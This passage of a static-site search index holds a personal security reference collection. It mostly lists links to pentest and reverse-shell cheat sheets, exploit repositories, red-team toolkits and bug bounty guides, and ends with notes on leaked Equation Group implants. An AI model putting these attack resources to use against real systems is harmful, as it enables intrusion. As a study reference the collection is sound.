{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Home This repository contains structurally organized, security related quick references, cheat-sheets, and resources maintained by ayomawdb . Please check different categories for more details. Home page is reserved mainly to list down pending analysis and pending research items, and also to point to other similar security related knowledge bases. Training Platforms https://www.enisa.europa.eu/topics/trainings-for-cybersecurity-specialists/online-training-material/technical-operational https://community.turgensec.com/shodan-pentesting-guide/ Cheatsheets Command line reference \u2013 Database and OS scripting: https://ss64.com/ RTFM (Red Team Field Manual) - https://github.com/leostat/rtfm http://cheat.sh/ curl https : // cht . sh / : cht . sh | sudo tee / usr / local / bin / cht . sh chmod + x / usr / local / bin / cht . sh mkdir ~/ . bash . d curl https : // cheat . sh / : bash_completion ~/ . bash . d / cht . sh chmod + x ~/ . bash . d / cht . sh . ~/ . bash . d / cht . sh # and add . ~/ . bash . d / cht . sh to ~/ . bashrc mkdir ~/ . zsh . d curl https : // cheat . sh / : zsh ~/ . zsh . d / _cht echo fpath=(~/.zsh.d/ $fpath) ~/ . zshrc Nmap: https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf Wireshark: https://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf TcpDump: https://packetlife.net/media/library/12/tcpdump.pdf Netcat: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf Ncat: https://medium.com/@pentest_it/ncat-cheatsheet-ddc5f07d8533 Scapy: https://blogs.sans.org/pen-testing/files/2016/04/ScapyCheatSheet_v0.2.pdf Powershell: https://blogs.sans.org/pen-testing/files/2016/05/PowerShellCheatSheet_v41.pdf Metasploit: https://blogs.sans.org/pen-testing/files/2017/02/MetasploitCheatsheet2.0.pdf Reverse Shell: https://highon.coffee/blog/reverse-shell-cheat-sheet/ Pentest Tools: https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/ LFI: https://highon.coffee/blog/lfi-cheat-sheet/ VI: https://highon.coffee/blog/vi-cheat-sheet/ Systemd: https://highon.coffee/blog/systemd-cheat-sheet/ Nbtscan: https://highon.coffee/blog/nbtscan-cheat-sheet/ Nmap: https://highon.coffee/blog/nmap-cheat-sheet/ Linux: https://highon.coffee/blog/linux-commands-cheat-sheet/ Day-to-day Tools CyberChef: https://gchq.github.io/CyberChef https://www.youtube.com/watch?v=LnhSTZgzKuY GoogleToolbox: https://toolbox.googleapps.com/apps/main/ Browserinfo, MX, Dig, HAR, Log Analyzer, Mail Headers, Encode/Decode https://pentest.ws/ Defining scope in Burp / ZAP: https://github.com/root4loot/rescope https://www.hackingarticles.in/koadic-com-command-control-framework/ Other Collections https://github.com/juliocesarfort/public-pentesting-reports Rawsec's CyberSecurity Inventory https://chryzsh.gitbooks.io/pentestbook/ ComputerSecurityStudent - Metasploitable Project Exploits: https://www.computersecuritystudent.com/cgi-bin/CSS/process_request_v3.pl?HID=f213c73c216e2231c8f0d65f3d93ac18 TYPE=SUB Exploit collection - https://github.com/jivoi/pentest Hacking Methodology: https://www.greycampus.com/opencampus/ethical-hacking/hacking-methodology https://twitter.com/Alra3ees/status/1075569238474141697 Red Team Tips: https://vincentyiu.co.uk/red-team-tips/ Red Teaming/Adversary Simulation Toolkit: https://github.com/infosecn1nja/Red-Teaming-Toolkit/blob/master/README.md Red Team Techniques: Gaining access on an external engagement through spear-phishing: https://blog.sublimesecurity.com/red-team-techniques-gaining-access-on-an-external-engagement-through-spear-phishing/ Red Team Tips: https://vincentyiu.co.uk/red-team-tips/ http://ired.team/ Pasties: https://github.com/threatexpress/pasties/blob/master/pasties.md Red Team Scripts: https://github.com/threatexpress/red-team-scripts 101 Bash Commands and Tips for Beginners to Experts: https://dev.to/awwsmm/101-bash-commands-and-tips-for-beginners-to-experts-30je The Book of Secret Knowledge: https://github.com/trimstray/the-book-of-secret-knowledge Offensive Security Bookmarks: https://jivoi.github.io/2015/07/03/offensive-security-bookmarks/ List of Awesome Red Teaming Resources: https://github.com/yeyintminthuhtut/Awesome-Red-Teaming http://ired.team/offensive-security-experiments/offensive-security-cheetsheets Playbook for system hardening maintained by the #! security research team.: https://github.com/hashbang/hardening Blogs https://github.com/sectalks/sectalks Practical use of JavaScript and COM Scriptlets for Penetration Testing: http://www.labofapenetrationtester.com/2016/05/ https://blog.0patch.com https://scriptdotsh.com https://room362.com/blog https://root4loot.com/ POC Repos https://github.com/qazbnm456/awesome-cve-poc Important files A binary that is a valid JAR, PE, ZIP, HTML: https://github.com/indrora/corkami/blob/master/src/mix/corkamix.asm / https://github.com/indrora/corkami/tree/master/src/mix Zip and Hach Collisions: https://github.com/corkami/collisions Crfting files in pure ASM: https://twitter.com/angealbertini/status/1088866350095835136 Podcasts https://darknetdiaries.com/ Graphs https://www.graphistry.com/ Pending Analysis CVEs Cisco CVE-2019-1653 - Allows a remote attacker to get sensitive device configuration details without a password. CVE-2019-1652 - Allows a remote attacker to inject and run admin commands on the device without a password. EternalRomance (MS17-010) Stuxnet CVEs Pending Analysis Tweets https://twitter.com/trimstray- Pending Analysis Tools sh00t - A Testing Environment for Manual Security Testers: https://github.com/pavanw3b/sh00t http://rumkin.com/tools Discord Channels https://discordapp.com/invite/VPFWfdt https://discordapp.com/invite/2AG6TCm https://discordapp.com/invite/4gHhxS8 https://discordapp.com/invite/7Z2PmWP https://discordapp.com/invite/malwaretech VMS Malware Analysis (windows): https://github.com/GoSecure/malboxes ATT CK ATT CKing the Singapore Health Data Breach: https://bitofhex.com/2019/01/13/attack-and-singapore-breach/ HELK Dashboard: https://github.com/Cyb3rWard0g/ATTACK-Python-Client/tree/master/integrations/helk_cti Buy Giant Board: https://groboards.com/ NFC Payments: Relay Attacks with LoRa: https://salmg.net/2019/01/12/nfc-payment-relay-attacks-with-lora/ https://www.aliexpress.com/item/SX1278-ESP32-LoRa-0-96-Inch-Blue-OLED-Display-Bluetooth-WIFI-Lora-Kit-32-Module-IOT/32825749403.html https://www.aliexpress.com/item/13-56mHz-PN532-compatible-raspberry-pie-NFC-card-reader-module/2055119495.html?spm=2114.search0104.3.29.166f4b4fElzuKj ws_ab_test=searchweb0_0,searchweb201602_5_10065_10068_10130_10890_10547_319_10546_317_10548_10545_10696_453_10084_454_10083_10618_431_10307_537_536_10059_10884_10887_100031_321_322_10103-10890,searchweb201603_53,ppcSwitch_0 algo_expid=8b42d885-fff2-4797-a3ea-3cfd99a32ed3-4 algo_pvid=8b42d885-fff2-4797-a3ea-3cfd99a32ed3 transAbTest=ae803_5 Bundle Raspberry Pi 7\" Touchscreen Display Case : https://www.amazon.it/gp/product/B01M0AT5O5 Pending DIY Projects RPi Handheld: https://twitter.com/CrankyLinuxUser/status/1095111251510915075 Privacy: https://www.privacynow.net/privacy-devices Network Gears: https://twitter.com/fouroctets/status/1092121490579906560 Tools for capturing and analysing keyboard input paired with microphone capture: https://github.com/ggerganov/kbd-audio Web NES-style CSS Framework: https://nostalgic-css.github.io/NES.css/ itty.bitty.site: https://itty.bitty.site/#How_it_Works/XQAAAAK4CgAAAAAAAAAeHMqHyTY4PyKmqfkwr6ooCXSIMxPQ7ojYR153HqZD3W+keVdvwyoyd+luwncAksxo8PWJs+831jtAVty8rDpGXmyebtxMTP3PSa4g8/593sWue8MDcpOgi1bQyEtfa0JNQZ6T1I/xyNULg1rpwWgE2Y9BnqDq8fDN1N+nd58bizHxZrkeBhdg8inSQ/xKDX7JxpEnuwOAh4FOfn3+EHSxzhJsdQjZfh3lk4tTCDexgFND30Ea3NmmJGK84pdMtEVlcmKC5lrnUNmgoJa3QFsHJkr5595tk03idElTDVhmcQI3jSvPrkTVFTnSLeARVZXV/EUiF0y7+cR3bVkLoTkamZWDMiCTY2Xhv0LdNqWlb/xxyk6takRLrNnS8DkifXEbevTbJOUamuK7uy55kL61btF+/lYNHLWGbh1ckCYglReWWMlM0k4uuqM24okcS74tHtOW3Y5HZYBmPvRR+ItSrZPvbj3kbztOrWapUp7nAzgfIjYoBV/4xOXpFbbaHRft5GICE5Mr1PQhmW/nB63nTpnR+7UdHag8WIMa7nf+NvTPKC5MmQnKzhaMuqEnwGgcM5vkWbekimBclkGJwTGeyhxL7N6hivY+KS3H7vcOSFHXGr7K3PBIQZbywqQiimQ6B6zu4RvH7ZZ3ZN++ii00HKM0FPMcNHuOnL99vAxEl6TEFnx4J4+fwzJwNbuut30TFMBgcrE4iKAGncFIHmvOstFWxE+VlvTLC+uy6XArTO8BdfmbByGiyFv8Al7HqLAzGShdGWNzJ6cPpRwMAmWl5GNRA4qwjQAlfF1dtTwfIXSWOL7AyRwxPs27uY2cvVHCdmVVTNDYiTzHeKX6D9e2ApDRFD6pgcA9VMVP6UeOdVdmwRJ+iLTwQuCdLbVWzQ5T2i/chlihD+RawylXJQ8bKvxW9egXGcrgR5dyKaZCr8nBrArAgtRLR7PdqBQQbr5VodBvPc2FP3fZ6UuQVI1Kg4KcY44GIU5vnlM029TU+ibO2iSX3FhusTFhyOxl4TjjkuXBqA1V7Ha/Op2m8QZaP68p7AAZPOcTHAwP5PxENqIf8qS2aaG2Fiwp5rNED3LhPMjtN54klBYylr5hSAr0TD8J+XwFds8Gq9LToLE8Cq7XNJnE9RqNudIozaMWkfc6PRFjp/aH87x97nPDelKKHGyUEnGJyobw45BOhJMKzZST0VA5v+uQQo0djDXc0UXwzNRIWeBLuUJQpaXZY2gZMuLiSERgyDHg2MBI6trWsyb3ZWbFS4rm8Gq2dxfih3Kj6MdNapUo/jltQ31nx2LepJCQe9DNNF6JEMecls6dHTAM2RfHxEODSSKkF17FfjRLRAfxCK927UvizAxxggP5S/HrX6mGc5xonBy3StLd16thiAG860IdvFyBKfE6+CIhe2jzIwIofNiBILYlKA61vKkjlfZjqsUGDLi426U/Y8bdpxfg7FX1gqNEHeVM17dlBTO7pNOnKyeM2xmLoE7lr92/VIrxJ2OqNfcHu9XjrD6l71vU083VwwAq8Vencm9xLAlDyy3/6BB0kRBiJbjayYrLUbQyMGTFfEvOPmc/zJjfdnqHmg5O/0kuzf2+w5CHD426iPngjmiTo5Snlf+qW8emK/ltnQQIv2ufykH+Px3XZM+zsOclAyHI5MbCKBKeT6j5geCiz3uqci1w5ZlpRjtJWUT6zCj8Fx1eg4F4ov51gaODKV+QQWeFJSyuVTm3Nu2i7AbhKikNzb3RBeQinEh9KrhHc+o4JGezOU55h1UZtonB0+J5dfBRqHnc+6HaXfTmcLrMZjWErq15cBmC0Kx6BNyqP3uGhMUSF+OuIzffEX9fGUNDpUtCjKdbml8uF43e4fN8o10TxYkbggTcyYKI+xWHMyKM2tjOideyDwt33minfEy/JgSLsihBnBua9sfXCg32/+i2okk= Tools Invisible Watermarks with Space Characters in ASCII Files: https://github.com/Neo23x0/space-id universal command-line interface for SQL databases: https://github.com/xo/usql Video editing: https://twitter.com/digininja/status/1007936435129847808 Multitail - Look at multiple log files in the same time A collection of security related toolsets (mostly Windows): https://github.com/GhostPack Pending Reads Analysis of following malware: * Badrabbit * NotPetya * Lazarus * https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180244/Lazarus_Under_The_Hood_PDF_final.pdf VPN Services: * NordVPN * MonoVM https://www.rebootuser.com/ Local Security Experts https://www.linkedin.com/in/kushantha https://www.linkedin.com/in/chanakaseekkuge/ Scripts tr - s | tr \\t | sed s/:/ |/ | sed s/- /| / | sed - e s/$/ |/ Tools Unicode steganography: https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder Incidence Response CIRTKit - Tools For The Computer Incident Response Team: https://github.com/opensourcesec/CIRTKit","title":"Home"},{"location":"#home","text":"This repository contains structurally organized, security related quick references, cheat-sheets, and resources maintained by ayomawdb . Please check different categories for more details. Home page is reserved mainly to list down pending analysis and pending research items, and also to point to other similar security related knowledge bases.","title":"Home"},{"location":"#training-platforms","text":"https://www.enisa.europa.eu/topics/trainings-for-cybersecurity-specialists/online-training-material/technical-operational https://community.turgensec.com/shodan-pentesting-guide/","title":"Training Platforms"},{"location":"#cheatsheets","text":"Command line reference \u2013 Database and OS scripting: https://ss64.com/ RTFM (Red Team Field Manual) - https://github.com/leostat/rtfm http://cheat.sh/ curl https : // cht . sh / : cht . sh | sudo tee / usr / local / bin / cht . sh chmod + x / usr / local / bin / cht . sh mkdir ~/ . bash . d curl https : // cheat . sh / : bash_completion ~/ . bash . d / cht . sh chmod + x ~/ . bash . d / cht . sh . ~/ . bash . d / cht . sh # and add . ~/ . bash . d / cht . sh to ~/ . bashrc mkdir ~/ . zsh . d curl https : // cheat . sh / : zsh ~/ . zsh . d / _cht echo fpath=(~/.zsh.d/ $fpath) ~/ . zshrc Nmap: https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf Wireshark: https://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf TcpDump: https://packetlife.net/media/library/12/tcpdump.pdf Netcat: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf Ncat: https://medium.com/@pentest_it/ncat-cheatsheet-ddc5f07d8533 Scapy: https://blogs.sans.org/pen-testing/files/2016/04/ScapyCheatSheet_v0.2.pdf Powershell: https://blogs.sans.org/pen-testing/files/2016/05/PowerShellCheatSheet_v41.pdf Metasploit: https://blogs.sans.org/pen-testing/files/2017/02/MetasploitCheatsheet2.0.pdf Reverse Shell: https://highon.coffee/blog/reverse-shell-cheat-sheet/ Pentest Tools: https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/ LFI: https://highon.coffee/blog/lfi-cheat-sheet/ VI: https://highon.coffee/blog/vi-cheat-sheet/ Systemd: https://highon.coffee/blog/systemd-cheat-sheet/ Nbtscan: https://highon.coffee/blog/nbtscan-cheat-sheet/ Nmap: https://highon.coffee/blog/nmap-cheat-sheet/ Linux: https://highon.coffee/blog/linux-commands-cheat-sheet/","title":"Cheatsheets"},{"location":"#day-to-day-tools","text":"CyberChef: https://gchq.github.io/CyberChef https://www.youtube.com/watch?v=LnhSTZgzKuY GoogleToolbox: https://toolbox.googleapps.com/apps/main/ Browserinfo, MX, Dig, HAR, Log Analyzer, Mail Headers, Encode/Decode https://pentest.ws/ Defining scope in Burp / ZAP: https://github.com/root4loot/rescope https://www.hackingarticles.in/koadic-com-command-control-framework/","title":"Day-to-day Tools"},{"location":"#other-collections","text":"https://github.com/juliocesarfort/public-pentesting-reports Rawsec's CyberSecurity Inventory","title":"Other Collections"},{"location":"#httpschryzshgitbooksiopentestbook","text":"ComputerSecurityStudent - Metasploitable Project Exploits: https://www.computersecuritystudent.com/cgi-bin/CSS/process_request_v3.pl?HID=f213c73c216e2231c8f0d65f3d93ac18 TYPE=SUB Exploit collection - https://github.com/jivoi/pentest Hacking Methodology: https://www.greycampus.com/opencampus/ethical-hacking/hacking-methodology https://twitter.com/Alra3ees/status/1075569238474141697 Red Team Tips: https://vincentyiu.co.uk/red-team-tips/ Red Teaming/Adversary Simulation Toolkit: https://github.com/infosecn1nja/Red-Teaming-Toolkit/blob/master/README.md Red Team Techniques: Gaining access on an external engagement through spear-phishing: https://blog.sublimesecurity.com/red-team-techniques-gaining-access-on-an-external-engagement-through-spear-phishing/ Red Team Tips: https://vincentyiu.co.uk/red-team-tips/ http://ired.team/ Pasties: https://github.com/threatexpress/pasties/blob/master/pasties.md Red Team Scripts: https://github.com/threatexpress/red-team-scripts 101 Bash Commands and Tips for Beginners to Experts: https://dev.to/awwsmm/101-bash-commands-and-tips-for-beginners-to-experts-30je The Book of Secret Knowledge: https://github.com/trimstray/the-book-of-secret-knowledge Offensive Security Bookmarks: https://jivoi.github.io/2015/07/03/offensive-security-bookmarks/ List of Awesome Red Teaming Resources: https://github.com/yeyintminthuhtut/Awesome-Red-Teaming http://ired.team/offensive-security-experiments/offensive-security-cheetsheets Playbook for system hardening maintained by the #! security research team.: https://github.com/hashbang/hardening","title":"https://chryzsh.gitbooks.io/pentestbook/"},{"location":"#blogs","text":"https://github.com/sectalks/sectalks Practical use of JavaScript and COM Scriptlets for Penetration Testing: http://www.labofapenetrationtester.com/2016/05/ https://blog.0patch.com https://scriptdotsh.com https://room362.com/blog https://root4loot.com/","title":"Blogs"},{"location":"#poc-repos","text":"https://github.com/qazbnm456/awesome-cve-poc","title":"POC Repos"},{"location":"#important-files","text":"A binary that is a valid JAR, PE, ZIP, HTML: https://github.com/indrora/corkami/blob/master/src/mix/corkamix.asm / https://github.com/indrora/corkami/tree/master/src/mix Zip and Hach Collisions: https://github.com/corkami/collisions Crfting files in pure ASM: https://twitter.com/angealbertini/status/1088866350095835136","title":"Important files"},{"location":"#podcasts","text":"https://darknetdiaries.com/","title":"Podcasts"},{"location":"#graphs","text":"https://www.graphistry.com/","title":"Graphs"},{"location":"#pending-analysis-cves","text":"Cisco CVE-2019-1653 - Allows a remote attacker to get sensitive device configuration details without a password. CVE-2019-1652 - Allows a remote attacker to inject and run admin commands on the device without a password. EternalRomance (MS17-010) Stuxnet CVEs","title":"Pending Analysis CVEs"},{"location":"#pending-analysis-tweets","text":"https://twitter.com/trimstray-","title":"Pending Analysis Tweets"},{"location":"#pending-analysis-tools","text":"sh00t - A Testing Environment for Manual Security Testers: https://github.com/pavanw3b/sh00t http://rumkin.com/tools","title":"Pending Analysis Tools"},{"location":"#discord-channels","text":"https://discordapp.com/invite/VPFWfdt https://discordapp.com/invite/2AG6TCm https://discordapp.com/invite/4gHhxS8 https://discordapp.com/invite/7Z2PmWP https://discordapp.com/invite/malwaretech","title":"Discord Channels"},{"location":"#vms","text":"Malware Analysis (windows): https://github.com/GoSecure/malboxes","title":"VMS"},{"location":"#attck","text":"ATT CKing the Singapore Health Data Breach: https://bitofhex.com/2019/01/13/attack-and-singapore-breach/ HELK Dashboard: https://github.com/Cyb3rWard0g/ATTACK-Python-Client/tree/master/integrations/helk_cti","title":"ATT&amp;CK"},{"location":"#buy","text":"Giant Board: https://groboards.com/ NFC Payments: Relay Attacks with LoRa: https://salmg.net/2019/01/12/nfc-payment-relay-attacks-with-lora/ https://www.aliexpress.com/item/SX1278-ESP32-LoRa-0-96-Inch-Blue-OLED-Display-Bluetooth-WIFI-Lora-Kit-32-Module-IOT/32825749403.html https://www.aliexpress.com/item/13-56mHz-PN532-compatible-raspberry-pie-NFC-card-reader-module/2055119495.html?spm=2114.search0104.3.29.166f4b4fElzuKj ws_ab_test=searchweb0_0,searchweb201602_5_10065_10068_10130_10890_10547_319_10546_317_10548_10545_10696_453_10084_454_10083_10618_431_10307_537_536_10059_10884_10887_100031_321_322_10103-10890,searchweb201603_53,ppcSwitch_0 algo_expid=8b42d885-fff2-4797-a3ea-3cfd99a32ed3-4 algo_pvid=8b42d885-fff2-4797-a3ea-3cfd99a32ed3 transAbTest=ae803_5 Bundle Raspberry Pi 7\" Touchscreen Display Case : https://www.amazon.it/gp/product/B01M0AT5O5","title":"Buy"},{"location":"#pending-diy-projects","text":"RPi Handheld: https://twitter.com/CrankyLinuxUser/status/1095111251510915075 Privacy: https://www.privacynow.net/privacy-devices Network Gears: https://twitter.com/fouroctets/status/1092121490579906560 Tools for capturing and analysing keyboard input paired with microphone capture: https://github.com/ggerganov/kbd-audio","title":"Pending DIY Projects"},{"location":"#web","text":"NES-style CSS Framework: https://nostalgic-css.github.io/NES.css/ itty.bitty.site: https://itty.bitty.site/#How_it_Works/XQAAAAK4CgAAAAAAAAAeHMqHyTY4PyKmqfkwr6ooCXSIMxPQ7ojYR153HqZD3W+keVdvwyoyd+luwncAksxo8PWJs+831jtAVty8rDpGXmyebtxMTP3PSa4g8/593sWue8MDcpOgi1bQyEtfa0JNQZ6T1I/xyNULg1rpwWgE2Y9BnqDq8fDN1N+nd58bizHxZrkeBhdg8inSQ/xKDX7JxpEnuwOAh4FOfn3+EHSxzhJsdQjZfh3lk4tTCDexgFND30Ea3NmmJGK84pdMtEVlcmKC5lrnUNmgoJa3QFsHJkr5595tk03idElTDVhmcQI3jSvPrkTVFTnSLeARVZXV/EUiF0y7+cR3bVkLoTkamZWDMiCTY2Xhv0LdNqWlb/xxyk6takRLrNnS8DkifXEbevTbJOUamuK7uy55kL61btF+/lYNHLWGbh1ckCYglReWWMlM0k4uuqM24okcS74tHtOW3Y5HZYBmPvRR+ItSrZPvbj3kbztOrWapUp7nAzgfIjYoBV/4xOXpFbbaHRft5GICE5Mr1PQhmW/nB63nTpnR+7UdHag8WIMa7nf+NvTPKC5MmQnKzhaMuqEnwGgcM5vkWbekimBclkGJwTGeyhxL7N6hivY+KS3H7vcOSFHXGr7K3PBIQZbywqQiimQ6B6zu4RvH7ZZ3ZN++ii00HKM0FPMcNHuOnL99vAxEl6TEFnx4J4+fwzJwNbuut30TFMBgcrE4iKAGncFIHmvOstFWxE+VlvTLC+uy6XArTO8BdfmbByGiyFv8Al7HqLAzGShdGWNzJ6cPpRwMAmWl5GNRA4qwjQAlfF1dtTwfIXSWOL7AyRwxPs27uY2cvVHCdmVVTNDYiTzHeKX6D9e2ApDRFD6pgcA9VMVP6UeOdVdmwRJ+iLTwQuCdLbVWzQ5T2i/chlihD+RawylXJQ8bKvxW9egXGcrgR5dyKaZCr8nBrArAgtRLR7PdqBQQbr5VodBvPc2FP3fZ6UuQVI1Kg4KcY44GIU5vnlM029TU+ibO2iSX3FhusTFhyOxl4TjjkuXBqA1V7Ha/Op2m8QZaP68p7AAZPOcTHAwP5PxENqIf8qS2aaG2Fiwp5rNED3LhPMjtN54klBYylr5hSAr0TD8J+XwFds8Gq9LToLE8Cq7XNJnE9RqNudIozaMWkfc6PRFjp/aH87x97nPDelKKHGyUEnGJyobw45BOhJMKzZST0VA5v+uQQo0djDXc0UXwzNRIWeBLuUJQpaXZY2gZMuLiSERgyDHg2MBI6trWsyb3ZWbFS4rm8Gq2dxfih3Kj6MdNapUo/jltQ31nx2LepJCQe9DNNF6JEMecls6dHTAM2RfHxEODSSKkF17FfjRLRAfxCK927UvizAxxggP5S/HrX6mGc5xonBy3StLd16thiAG860IdvFyBKfE6+CIhe2jzIwIofNiBILYlKA61vKkjlfZjqsUGDLi426U/Y8bdpxfg7FX1gqNEHeVM17dlBTO7pNOnKyeM2xmLoE7lr92/VIrxJ2OqNfcHu9XjrD6l71vU083VwwAq8Vencm9xLAlDyy3/6BB0kRBiJbjayYrLUbQyMGTFfEvOPmc/zJjfdnqHmg5O/0kuzf2+w5CHD426iPngjmiTo5Snlf+qW8emK/ltnQQIv2ufykH+Px3XZM+zsOclAyHI5MbCKBKeT6j5geCiz3uqci1w5ZlpRjtJWUT6zCj8Fx1eg4F4ov51gaODKV+QQWeFJSyuVTm3Nu2i7AbhKikNzb3RBeQinEh9KrhHc+o4JGezOU55h1UZtonB0+J5dfBRqHnc+6HaXfTmcLrMZjWErq15cBmC0Kx6BNyqP3uGhMUSF+OuIzffEX9fGUNDpUtCjKdbml8uF43e4fN8o10TxYkbggTcyYKI+xWHMyKM2tjOideyDwt33minfEy/JgSLsihBnBua9sfXCg32/+i2okk=","title":"Web"},{"location":"#tools","text":"Invisible Watermarks with Space Characters in ASCII Files: https://github.com/Neo23x0/space-id universal command-line interface for SQL databases: https://github.com/xo/usql Video editing: https://twitter.com/digininja/status/1007936435129847808 Multitail - Look at multiple log files in the same time A collection of security related toolsets (mostly Windows): https://github.com/GhostPack","title":"Tools"},{"location":"#pending-reads","text":"Analysis of following malware: * Badrabbit * NotPetya * Lazarus * https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180244/Lazarus_Under_The_Hood_PDF_final.pdf VPN Services: * NordVPN * MonoVM https://www.rebootuser.com/","title":"Pending Reads"},{"location":"#local-security-experts","text":"https://www.linkedin.com/in/kushantha","title":"Local Security Experts"},{"location":"#httpswwwlinkedincominchanakaseekkuge","text":"","title":"https://www.linkedin.com/in/chanakaseekkuge/"},{"location":"#scripts","text":"tr - s | tr \\t | sed s/:/ |/ | sed s/- /| / | sed - e s/$/ |/","title":"Scripts"},{"location":"#tools_1","text":"Unicode steganography: https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder","title":"Tools"},{"location":"#incidence-response","text":"CIRTKit - Tools For The Computer Incident Response Team: https://github.com/opensourcesec/CIRTKit","title":"Incidence Response"},{"location":"bug-hunting/","text":"Bounty Programs ZERODIUM is the leading exploit acquisition platform for premium zero-days and advanced cybersecurity capabilities FedBounty - A Federally Sponsored National Bug Bounty Program Bounty Guides Subdomain takeover Hitchhiker\u2019s Guide to Bug Bounty Hunting Throughout the Galaxy. v2 by Nick Jenkins Guide to Responsible Disclosure and Bug Bounty Educational Content Connections Google Bughunter University BugCroud University Getting started in bugbounties Writeups Writeup Collections https://pentester.land/list-of-bug-bounty-writeups.html Facebook Disclosing page members Google writeups $7.5k Google Cloud Platform organization issue","title":"Bug hunting"},{"location":"bug-hunting/#bounty-programs","text":"ZERODIUM is the leading exploit acquisition platform for premium zero-days and advanced cybersecurity capabilities FedBounty - A Federally Sponsored National Bug Bounty Program","title":"Bounty Programs"},{"location":"bug-hunting/#bounty-guides","text":"Subdomain takeover Hitchhiker\u2019s Guide to Bug Bounty Hunting Throughout the Galaxy. v2 by Nick Jenkins Guide to Responsible Disclosure and Bug Bounty","title":"Bounty Guides"},{"location":"bug-hunting/#educational-content-connections","text":"Google Bughunter University BugCroud University Getting started in bugbounties","title":"Educational Content Connections"},{"location":"bug-hunting/#writeups","text":"","title":"Writeups"},{"location":"bug-hunting/#writeup-collections","text":"https://pentester.land/list-of-bug-bounty-writeups.html","title":"Writeup Collections"},{"location":"bug-hunting/#facebook","text":"Disclosing page members","title":"Facebook"},{"location":"bug-hunting/#google-writeups","text":"$7.5k Google Cloud Platform organization issue","title":"Google writeups"},{"location":"career/","text":"References We Need to Kill the \u2018Security Analyst\u2019: https://medium.com/@LargeCardinal/we-need-to-kill-the-security-analyst-79ec205651f5 Preparing for a Tech Talk, Part 1: Motivation: https://overreacted.io/preparing-for-tech-talk-part-1-motivation/ Preparing for a Tech Talk, Part 2: What, Why, and How: https://overreacted.io/preparing-for-tech-talk-part-2-what-why-and-how/ My first experience as speaker at Voxxed Days 2018: a talk about React, React Native and Typescript: https://www.fabrizioduroni.it/2018/11/01/react-native-typescript-conference-voxxed-2018.html 10 Personal Finance Lessons for Technology Professionals: https://www.troyhunt.com/10-personal-finance-lessons-for-technology-professionals/ Quotes The real pros ask the real questions : 1 ) If 2 ) When 3 ) Why 4 ) What 5 ) How much have you got 6 ) Have you got it 7 ) Do you get it 8 ) If so , how often 9 ) Which do you choose , a hard or soft option 10 ) How much do you need ?","title":"Career"},{"location":"career/#references","text":"We Need to Kill the \u2018Security Analyst\u2019: https://medium.com/@LargeCardinal/we-need-to-kill-the-security-analyst-79ec205651f5 Preparing for a Tech Talk, Part 1: Motivation: https://overreacted.io/preparing-for-tech-talk-part-1-motivation/ Preparing for a Tech Talk, Part 2: What, Why, and How: https://overreacted.io/preparing-for-tech-talk-part-2-what-why-and-how/ My first experience as speaker at Voxxed Days 2018: a talk about React, React Native and Typescript: https://www.fabrizioduroni.it/2018/11/01/react-native-typescript-conference-voxxed-2018.html 10 Personal Finance Lessons for Technology Professionals: https://www.troyhunt.com/10-personal-finance-lessons-for-technology-professionals/","title":"References"},{"location":"career/#quotes","text":"The real pros ask the real questions : 1 ) If 2 ) When 3 ) Why 4 ) What 5 ) How much have you got 6 ) Have you got it 7 ) Do you get it 8 ) If so , how often 9 ) Which do you choose , a hard or soft option 10 ) How much do you need ?","title":"Quotes"},{"location":"collections/","text":"Binaries Nmap: - https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ Leaked Datasets Disclaimer: These links are intended to be used by information security researchers who are interested in understanding the capabilities of frameworks/data-sets used in real-life. I am not responsible if you choose to use my work or this documentation to do something dumb and/or illegal. Shadowbroker https://www.comae.com/reports/us-17-Suiche-TheShadowBrokers-Cyber-Fear-Game-Changers-wp.pdf https://swithak.github.io/SH20TAATSB18/Study/AnalysesANDProfiles/TSB-ZeroNet/ https://lostar.com.tr/2017/04/nsa-hepimizi-izliyor.html https://www.revolvy.com/page/The-Shadow-Brokers EQGRP Lost in Translation References: [MUSTREAD]: Buckeye: Espionage Outfit Used Equation Group Tools Prior to Shadow Brokers Leak Confirmed: Leaked Equation Group Hacking Tools Are Real https://www.symantec.com/blogs/threat-intelligence/buckeye-windows-zero-day-exploit https://github.com/misterch0c/shadowbroker DanderSpritz https://github.com/francisck/DanderSpritz_docs DanderSpritz Setup - https://danderspritz.com/ DSky Darkskyline PacketCapture tool DaPu DarkPulsar Appears to be a legacy implant, similar to PeddleCheap but older Darkskyline DarkSkyline Contains tools to parse and filter traffic captured by DarkSkyline DeMI DecibelMinute Appears to interact with KillSuit to install, configure, and uninstall it Df DoubleFeature Generates a log report about the types of tools that could be deployed on the target. A lot of tools mention that doublefeature is the only way to confirm their existence DmGZ DoormanGauze DoormanGauze is a kernel level network driver that appears to bypass the standard Windows TCP/IP stack Dsz DanderSpritz Several DanderSpritz specific files such as command descriptions (in XML), and several scripts with DSS (Debug script interface?) / DSI extensions?. They seem to be scripts run by DanderSpritz Ep ExpandingPulley Listening Post developed in 2001 and abandoned in 2008. Predecessor to DanderSpritz ExternalLibraries N/A Well.. FlAv FlewAvenue Appears related to DoormanGauze (based on FlAv/scripts/_FlewAvenue.txt) GRDO GreaterDoctor Appears to parse / process from GreaterSurgeon (based on GRDO/Tools/i386/GreaterSurgeon_postProcess.py analyzeMFT.py) GROK ?? Appears to be a keylogger (based on Ops/PyScripts/overseer/plugins/keylogger.py) GRcl ?? Appears to dump memory from a specific process (based on GRcl/Commands/CommandLine/ProcessMemory_Command.xml) GaTh GangsterTheif Appears to parse data gathered by GreaterDoctor to identify other (malicious) software that may be installed persistently (based on GaTh/Commands/CommandLine/GrDo_ProcessScanner_Command.xml) GeZU GreaterSurgeon Appears to dump memory (based on 